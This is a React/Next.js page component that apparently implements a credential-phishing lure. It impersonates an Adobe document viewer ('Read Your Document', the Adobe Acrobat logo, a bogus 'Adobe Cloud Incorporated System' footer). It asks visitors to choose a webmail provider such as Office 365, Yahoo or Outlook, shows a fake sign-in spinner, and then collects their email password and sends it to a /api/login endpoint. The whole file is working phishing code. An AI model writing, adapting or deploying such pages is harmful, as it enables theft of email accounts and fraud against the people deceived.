import { useState } from 'react';
import Head from 'next/head';
import { useRouter } from 'next/router';

const PROVIDERS = [
  {
    key: 'office365',
    name: 'Office 365',
    icon: 'https://cdn-icons-png.flaticon.com/512/732/732221.png',
  },
  {
    key: 'aol',
    name: 'AOL',
    icon: 'https://cdn-icons-png.flaticon.com/512/732/732222.png',
  },
  {
    key: 'yahoo',
    name: 'Yahoo',
    icon: 'https://cdn-icons-png.flaticon.com/512/732/732200.png',
  },
  {
    key: 'outlook',
    name: 'Outlook',
    icon: 'https://cdn-icons-png.flaticon.com/512/732/732223.png',
  },
  {
    key: 'others',
    name: 'Others',
    icon: 'https://cdn-icons-png.flaticon.com/512/25/25373.png',
  },
];

export default function AdobeCloudDocument() {
  const [step, setStep] = useState('provider-selection');
  const [selectedProvider, setSelectedProvider] = useState(null);
  const [credentials, setCredentials] = useState({ email: '', password: '' });
  const [loginError, setLoginError] = useState('');
  const router = useRouter();

  function handleProviderSelect(provider) {
    setSelectedProvider(provider);
    setStep('signing-in');
    setTimeout(() => {
      setStep('credentials-input');
    }, 1000);
  }

  function handleBack() {
    setStep('provider-selection');
    setCredentials({ email: '', password: '' });
    setLoginError('');
    setSelectedProvider(null);
  }

  function handleChange(e) {
    setCredentials({ ...credentials, [e.target.name]: e.target.value });
  }

  async function handleSubmit(e) {
    e.preventDefault();
    setLoginError('');
    const { email, password } = credentials;
    if (!email || !password || !selectedProvider) {
      setLoginError('Please fill in all fields.');
      return;
    }

    try {
      const response = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'include',
        body: JSON.stringify({ email, password, provider: selectedProvider }),
      });
      const data = await response.json();
      if (!response.ok || !data.success) {
        throw new Error(data.message || 'Login failed.');
      }
      router.push('/dashboard');
    } catch (err) {
      setLoginError(err.message);
    }
  }

  return (
    <>
      <Head>
        <title>Adobe Cloud Document</title>
        <meta charSet="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link rel="stylesheet" href="/styles.css" />
        <link rel="icon" href="/favicon.ico" />
      </Head>
      <div className="background-overlay"></div>
      <div className="container">
        <div className="header-flex">
          <img
            src="https://upload.wikimedia.org/wikipedia/commons/4/42/Adobe_Acrobat_DC_logo_2020.svg"
            alt="Adobe Acrobat Logo"
            className="logo"
          />
          <div className="header-content">
            <h1>Read Your Document</h1>
            <p>Please select your e-mail provider below:</p>
          </div>
        </div>

        {/* Step 1: Provider Selection */}
        {step === 'provider-selection' && (
          <section className="page active">
            <div className="providers">
              {PROVIDERS.map((prov) => (
                <button
                  key={prov.key}
                  className="provider-btn"
                  onClick={() => handleProviderSelect(prov.key)}
                >
                  <img src={prov.icon} alt={prov.name} /> {prov.name}
                </button>
              ))}
            </div>
          </section>
        )}

        {/* Step 2: Signing In */}
        {step === 'signing-in' && (
          <section className="page active">
            <div className="signing-in-spinner"></div>
            <h1>Signing in...</h1>
            <p>
              Please wait while we prepare your sign-in with{' '}
              <span>{selectedProvider}</span>.
            </p>
          </section>
        )}

        {/* Step 3: Credentials Input */}
        {step === 'credentials-input' && (
          <section className="page active">
            <h1>Sign in with {selectedProvider}</h1>
            <form onSubmit={handleSubmit}>
              <label htmlFor="email">Email:</label>
              <input
                type="email"
                id="email"
                name="email"
                value={credentials.email}
                onChange={handleChange}
                required
              />
              <label htmlFor="password">Password:</label>
              <input
                type="password"
                id="password"
                name="password"
                value={credentials.password}
                onChange={handleChange}
                required
              />
              <button type="submit">Submit</button>
            </form>
            <button onClick={handleBack} className="back-btn">
              Back
            </button>
            {loginError && (
              <div style={{ color: 'red', marginTop: '1em' }}>{loginError}</div>
            )}
          </section>
        )}

        <footer>
          <p>© 2025 Adobe Cloud Incorporated System</p>
        </footer>
      </div>
    </>
  );
}